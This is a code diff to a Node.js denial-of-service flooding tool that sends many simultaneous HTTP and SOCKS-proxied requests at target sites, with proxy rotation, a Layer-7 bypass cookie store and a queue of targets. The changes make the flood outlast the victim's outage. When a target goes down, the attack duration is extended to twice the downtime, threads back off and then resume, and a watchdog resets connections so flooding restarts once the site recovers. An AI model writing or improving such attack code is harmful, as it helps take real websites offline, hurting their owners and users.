@@ -244,6 +244,7 @@ function socksRequest(url, agent, threadId) {
       if (res.statusCode !== 200 && Math.random() < 0.01) {
         try { console.error(colors.gray(`[${new Date().toLocaleTimeString()}] [socks] ${url} → ${res.statusCode} (${Date.now()-start}ms)`)); } catch {}
       }
+      lastSuccessTime = Date.now();
       resolve({ status: res.statusCode });
     });
     req.on("error", (err) => {
@@ -270,6 +271,10 @@ function createContext(proxyLine) {
 
 // Track consecutive failures per host to detect blocking/rate-limiting
 const hostFailureCount = new Map();
+// Track last time any request succeeded (to detect server downtime vs rate-limiting)
+let lastSuccessTime = Date.now();
+// Per-thread backoff state: Map<threadId, { consecutiveFailures, backoffMs }>
+const threadBackoff = new Map();
 
 const fireHTTPRequest = (url, ctx, threadId) => {
   return new Promise((resolve) => {
@@ -309,6 +314,7 @@ const fireHTTPRequest = (url, ctx, threadId) => {
     const req = (parsedUrl.protocol === "https:" ? https : http).request(options, (res) => {
       // Reset failure count on successful response
       if (hostFailureCount.has(host)) hostFailureCount.delete(host);
+      lastSuccessTime = Date.now();
       if (L7_BYPASS && res.headers) storeCookies(host, res.headers);
       res.resume();
       // Log non-200 status codes occasionally for diagnostics
@@ -348,8 +354,17 @@ if (USE_CLUSTER && cluster.isWorker) {
 
       const endTime = target.startTime + target.duration;
       if (Date.now() > endTime) {
-        if (process.connected) process.send({ type: "targetComplete" });
-        return;
+        // If server has been unreachable recently, extend duration instead of stopping
+        const msSinceLastSuccess = Date.now() - lastSuccessTime;
+        if (msSinceLastSuccess > 15000) {
+          const extension = Math.max(60000, msSinceLastSuccess * 2);
+          target.duration += extension;
+          target.startTime += extension;
+          // Continue the attack cycle — don't return
+        } else if (process.connected) {
+          process.send({ type: "targetComplete" });
+          return;
+        }
       }
 
       // Launch ALL attack types simultaneously
@@ -372,7 +387,7 @@ if (USE_CLUSTER && cluster.isWorker) {
       } else if (ctx.type === "http") {
         promises.push(
           urequest(url, { dispatcher: ctx.dispatcher, method: "GET", headers: getNoCacheHeaders(), signal: AbortSignal.timeout(REQUEST_TIMEOUT) })
-            .then(async (res) => { await res.body.dump(); return { status: res.statusCode }; })
+            .then(async (res) => { lastSuccessTime = Date.now(); await res.body.dump(); return { status: res.statusCode }; })
             .catch(() => null)
         );
       } else {
@@ -429,8 +444,10 @@ if (USE_CLUSTER && cluster.isWorker) {
 }
 
 // ===================== WATCHDOG =====================
-// Periodically checks if the attack should be running but threads appear dead.
-// Re-spawns attack threads if the process is still alive but no requests are flowing.
+// Periodically checks if the attack appears stalled.
+// Does NOT spawn new threads (that would leak). Instead, resets connection
+// state (hostFailureCount, backoff) so existing threads can recover.
+// If the server is genuinely down, threads are already backing off exponentially.
 
 let watchdogTimer = null;
 let lastWatchdogReqCount = 0;
@@ -447,37 +464,23 @@ function startWatchdog() {
       if (currentCount === lastWatchdogReqCount) {
         watchdogStallCount++;
         if (watchdogStallCount >= 5) { // 5 consecutive stalls = ~5 seconds of no activity
-          console.log(colors.yellow("[Watchdog] Attack appears stalled — respawning threads..."));
-          // Respawning: set flag and restart attack on the same target
-          const savedTarget = currentTarget;
-          continueAttack = true; // Ensure flag is set
-          activeThreads = [];
-          const proxies = loadProxies();
-          let threadId = 0;
-          const directCount = proxies.length ? Math.floor(numThreads / 2) : numThreads;
-          const proxyCount = proxies.length ? numThreads - directCount : 0;
-          if (!proxies.length) {
-            for (let i = 0; i < numThreads; i++) {
-              if (!continueAttack) break;
-              performAttackSingle(savedTarget, { type: "direct" }, threadId++, true);
-              activeThreads.push(i);
-            }
-          } else {
-            for (let i = 0; i < directCount; i++) {
-              if (!continueAttack) break;
-              performAttackSingle(savedTarget, { type: "direct" }, threadId++, true);
-              activeThreads.push(i);
-            }
-            for (let i = 0; i < proxyCount; i++) {
-              if (!continueAttack) break;
-              performAttackSingle(savedTarget, createContext(getRandomElement(proxies)), threadId++, false);
-              activeThreads.push(i + directCount);
-            }
-          }
-          console.log(colors.green(`[Watchdog] Respinned ${activeThreads.length} threads`));
+          console.log(colors.yellow(`[Watchdog] 0 req/s for ${watchdogStallCount}s — resetting connection state...`));
+          // Reset connection state so threads can try fresh connections
+          hostFailureCount.clear();
+          threadBackoff.clear();
+          closeAllUdpSockets();
           watchdogStallCount = 0;
         }
+        // Every 30 seconds, also log a server-down warning
+        if (watchdogStallCount >= 30) {
+          console.log(colors.yellow(`[Watchdog] Server appears down for ${Math.round((Date.now() - lastSuccessTime)/1000)}s — threads backing off, will resume when server recovers`));
+          watchdogStallCount = 0; // Reset to avoid spamming every second
+        }
       } else {
+        // If requests are flowing again, reset stall counter
+        if (watchdogStallCount > 0) {
+          console.log(colors.green(`[Watchdog] Traffic resumed after ${watchdogStallCount}s stall`));
+        }
         watchdogStallCount = 0;
       }
       lastWatchdogReqCount = currentCount;
@@ -721,27 +724,39 @@ const startAttack = async (url, durationHours) => {
 // Single-process attack function — wrapped in try/catch so errors
 // in one cycle never kill the thread. The next cycle is always scheduled.
 const performAttackSingle = async (target, ctx, threadId, isDirect) => {
+  let backoffDelay = 0;
   try {
     if (!continueAttack || !target) return;
 
     const endTime = target.startTime + target.duration;
     if (Date.now() > endTime) {
-      console.log(colors.yellow(`Target completed: ${target.url}`));
-      if (targetQueue.length > 0) {
-        currentTarget = targetQueue.shift();
-        console.log(colors.green(`Starting next target from queue: ${currentTarget.url}`));
-        resetTotal();
-        state = { continueAttack, currentTarget, totalRequests: totalRequestsSent, queue: targetQueue };
-        saveNow();
+      // If server has been unreachable recently, extend duration instead of stopping
+      const msSinceLastSuccess = Date.now() - lastSuccessTime;
+      if (msSinceLastSuccess > 15000) {
+        // Server appears down — extend duration by 2x the downtime to ensure recovery time
+        const extension = Math.max(60000, msSinceLastSuccess * 2);
+        target.duration += extension;
+        target.startTime += extension;
+        console.log(colors.yellow(`[Recovery] Server unreachable for ${Math.round(msSinceLastSuccess/1000)}s — extending duration by ${Math.round(extension/60000)}min`));
+        // Continue the attack cycle — don't return
       } else {
-        continueAttack = false;
-        currentTarget = null;
-        resetTotal();
-        state = { continueAttack: false, currentTarget: null, totalRequests: 0, queue: [] };
-        saveNow();
-        console.log(colors.yellow("All targets completed. Attack finished."));
+        console.log(colors.yellow(`Target completed: ${target.url}`));
+        if (targetQueue.length > 0) {
+          currentTarget = targetQueue.shift();
+          console.log(colors.green(`Starting next target from queue: ${currentTarget.url}`));
+          resetTotal();
+          state = { continueAttack, currentTarget, totalRequests: totalRequestsSent, queue: targetQueue };
+          saveNow();
+        } else {
+          continueAttack = false;
+          currentTarget = null;
+          resetTotal();
+          state = { continueAttack: false, currentTarget: null, totalRequests: 0, queue: [] };
+          saveNow();
+          console.log(colors.yellow("All targets completed. Attack finished."));
+        }
+        return;
       }
-      return;
     }
 
     // Launch ALL attack types simultaneously
@@ -765,7 +780,7 @@ const performAttackSingle = async (target, ctx, threadId, isDirect) => {
       } else if (ctx.type === "http") {
         promises.push(
           urequest(url, { dispatcher: ctx.dispatcher, method: "GET", headers: getNoCacheHeaders(), signal: AbortSignal.timeout(REQUEST_TIMEOUT) })
-            .then(async (res) => { await res.body.dump(); return { status: res.statusCode }; })
+            .then(async (res) => { lastSuccessTime = Date.now(); await res.body.dump(); return { status: res.statusCode }; })
             .catch(() => null)
         );
       } else {
@@ -784,13 +799,27 @@ const performAttackSingle = async (target, ctx, threadId, isDirect) => {
     totalRequestsSent += successfulRequests;
     debouncedSave();
 
+    // Per-thread backoff: if 0 successes, delay next cycle (prevents local resource exhaustion)
+    if (successfulRequests === 0 && REQUESTS_PER_CYCLE > 0) {
+      let state = threadBackoff.get(threadId) || { consecutiveFailures: 0, backoffMs: 0 };
+      state.consecutiveFailures++;
+      // Exponential backoff: 500ms → 1s → 2s → 5s (max)
+      state.backoffMs = Math.min(5000, Math.max(500, state.backoffMs * 2 || 500));
+      threadBackoff.set(threadId, state);
+      backoffDelay = state.backoffMs;
+    } else {
+      // Reset backoff on success
+      threadBackoff.delete(threadId);
+    }
+
     const duration = Date.now() - startTime;
     if (threadId === 0 && duration > 0) {
       const now = Date.now();
       if (now - lastStatusLog > 1000) {
         lastStatusLog = now;
         const rps = (successfulRequests / (duration / 1000)).toFixed(1);
-        console.log(`${colors.green(">")} ${colors.gray(`[${new Date().toLocaleTimeString()}]`)} ${colors.red(`${formatNumber(successfulRequests)} req`)} | ${colors.cyan(`Total: ${formatNumber(totalRequestsSent)}`)} | ${colors.green(`RPS: ${rps}`)} | ${colors.magenta(`Threads: ${activeThreads.length}`)}`);
+        const backoffHint = successfulRequests === 0 ? ` ${colors.gray(`[backoff]`)}` : '';
+        console.log(`${colors.green(">")} ${colors.gray(`[${new Date().toLocaleTimeString()}]`)} ${colors.red(`${formatNumber(successfulRequests)} req`)} | ${colors.cyan(`Total: ${formatNumber(totalRequestsSent)}`)} | ${colors.green(`RPS: ${rps}`)} | ${colors.magenta(`Threads: ${activeThreads.length}`)}${backoffHint}`);
       }
     }
   } catch (err) {
@@ -800,7 +829,8 @@ const performAttackSingle = async (target, ctx, threadId, isDirect) => {
   // Always schedule next cycle — errors in one cycle never kill the thread
   if (continueAttack) {
     const j = getJitter();
-    if (j > 0) setTimeout(() => performAttackSingle(target, ctx, threadId, isDirect), j);
+    const delay = backoffDelay > 0 ? backoffDelay : (j > 0 ? j : 0);
+    if (delay > 0) setTimeout(() => performAttackSingle(target, ctx, threadId, isDirect), delay);
     else setImmediate(() => performAttackSingle(target, ctx, threadId, isDirect));
   }
 };
